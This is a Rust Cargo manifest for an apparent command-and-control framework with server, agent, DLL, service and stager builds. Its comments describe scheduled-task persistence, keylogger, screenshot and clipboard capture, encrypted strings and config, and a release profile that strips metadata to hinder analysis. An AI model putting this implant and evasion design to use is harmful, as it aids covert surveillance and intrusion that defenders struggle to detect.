[workspace]
members = ["strcrypt", "client_dll"]

[package]
name = "rcm"
version = "0.1.0"
edition = "2021"

# `agent_build` is a custom cfg injected by src/bin/builder.rs (via RUSTFLAGS)
# when compiling agent binaries (client, client_dll, client_service, stager).
# Register it here so plain `cargo check`/`cargo build` of the lib and the
# server-side bins does not trip the unexpected_cfgs lint on the
# `#[cfg(agent_build)]` gates in src/config.rs.
[lints.rust]
unexpected_cfgs = { level = "allow", check-cfg = ["cfg(agent_build)"] }

[lib]
name = "rcm"
path = "src/lib.rs"

[[bin]]
name = "server"
path = "src/bin/server.rs"

[[bin]]
name = "client"
path = "src/bin/client.rs"

# client_dll is NOT a bin target: cargo rejects crate-type on [[bin]], so
# the agent DLL lives in the client_dll/ workspace member as a cdylib (its
# artifact is a real PE DLL with a DllMain export). Build it with
# `cargo build -p client_dll`.

[[bin]]
name = "client_service"
path = "src/bin/client_service.rs"

[[bin]]
name = "stager"
path = "src/bin/stager.rs"

[[bin]]
name = "builder"
path = "src/bin/builder.rs"

[features]
# Suppress ALL tracing callsite metadata (agent + deps) for shipped agents.
# Passed by builder.rs as -F agent-quiet for non-debug builds only, so the
# server and --debug agents keep their logs.
agent-quiet = ["tracing/release_max_level_off", "log/release_max_level_off"]

[dependencies]
hyper       = { version = "0.14", features = ["http1","server","client","runtime","tcp"] }
log = "0.4"  # direct dep so agent-quiet can set its max-level filter
# Async Core
tokio = { version = "1", features = ["full"] }
futures = "0.3"
tokio-util = { version = "0.7", features = ["compat", "rt", "io"] }

# Multiplexing
yamux = "0.10"

# Security & Utils
rustls = "0.21"
tokio-rustls = "0.24"
rustls-pemfile = "1.0"
ed25519-dalek = { version = "2", features = ["rand_core"] }
rand = "0.8"
sha2 = "0.10"
hmac = "0.12"
base64 = "0.21"
hex = "0.4"
uuid = { version = "1.4", features = ["v4"] }
machine-uid = "0.5"
hostname = "0.3"
chrono = { version = "0.4", features = ["serde"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
toml = "0.8"
rustyline = "12.0"
argon2 = "0.5"
subtle = "2.5"

# Database
dashmap = "5"
rusqlite = { version = "0.29", features = ["bundled"] }
r2d2 = "0.8"
r2d2_sqlite = "0.22"

# API Server
axum = { version = "0.6", features = ["headers"] }
tower = { version = "0.4", features = ["util"] }
tower-http = { version = "0.4", features = ["auth", "cors"] }
http = "0.2"
reqwest = { version = "0.11", default-features = false, features = ["blocking", "socks", "json", "rustls-tls", "multipart"] }  # rustls-tls: pure-Rust TLS (no OpenSSL C lib) - required for the fully-static musl agent
rhai = { version = "1.16", features = ["sync"] }
walkdir = "2"
sys-info = "0.9"
aes-gcm = "0.10"
aes = "0.8"
cbc = { version = "0.1", features = ["alloc"] }
flate2 = "1"
tar = "0.4"
pbkdf2 = "0.12"
sha1 = "0.10"
zeroize = "1"
zip = "0.6"
# Force vendored (static) builds of compression C libraries. Without
# this, bzip2-sys probes pkg-config on the build host and dynamically
# links system libbz2 (SONAME libbz2.so.1.0, Debian-style) - which does
# not exist on Fedora/RHEL (SONAME libbz2.so.1), breaking agents there.
bzip2 = { version = "0.4", features = ["static"] }

regex = "1"
md-5 = "0.10"
crc32fast = "1"

# Builder Dependencies
clap = { version = "4.4", features = ["derive"] }
anyhow = "1.0"
thiserror = "1"
url = "2"
libc = "0.2"

# Logging & Observability
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter", "time", "local-time"] }
tracing-appender = "0.2"

# Encrypt runtime strings
litcrypt = "0.4"
strcrypt = { path = "strcrypt" }

# Media & Clipboard [UPDATED]
# screenshots moved to [target.'cfg(not(target_env = "musl"))'.dependencies] below

image = "0.24"
# arboard moved to [target.'cfg(not(target_env = "musl"))'.dependencies] below


# Windows COM (ITaskService - scheduled task persistence, MSVC native builds only).
# MinGW / cross-compiled agents (x86_64-pc-windows-gnu) fall back to schtasks.exe.
[target.'cfg(all(target_os = "windows", target_env = "msvc"))'.dependencies]
windows = { version = "0.52", features = [
    "Win32_Foundation",
    "Win32_System_Com",
    "Win32_System_TaskScheduler",
] }

[build-dependencies]
serde_json = "1.0"
hex = "0.4"
rand = "0.8"
# Text-shapes the embedded config ciphertext (base64 carrier in the
# generated config code instead of a raw byte array).
base64 = "0.21"

[dev-dependencies]
tempfile    = "3"
sha2        = "0.10"
tower       = { version = "0.4", features = ["util"] }

# --- OPSEC release profile ----------------------------------------------------
# Release binaries (especially the agent) must carry zero recoverable metadata:
#   opt-level = "z"    minimize size (smaller attack/analysis surface)
#   lto = true         full cross-crate LTO; enables dead-code elimination of
#                      unused string/data paths
#   codegen-units = 1  single unit so LTO sees the whole crate graph
#   panic = "abort"    no unwinding runtime, no landing pads, smaller binary
#   strip = true       strip symbols from the final binary
#   debug = false      no DWARF debuginfo (no source paths / line tables).
#                      Explicit because profile values are inherited by anyone
#                      overriding this profile, and debuginfo would re-leak the
#                      paths -Ztrim-paths removes from panic strings.
# Panic-location strings additionally need nightly RUSTFLAGS injected by
# builder.rs: -Zlocation-detail=none -Ztrim-paths (see rust-toolchain.toml).
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
debug = false

# X11-dependent crates (screenshot + clipboard capture) are not available for
# fully-static musl builds: they would drag libxcb/libX11 C dependencies back
# in. They are compiled on every target EXCEPT musl; the agent exposes stub
# responses there instead (see media.rs / keylogger.rs cfg gates).
[target.'cfg(not(target_env = "musl"))'.dependencies]
screenshots = "0.8"
arboard = "3.2"
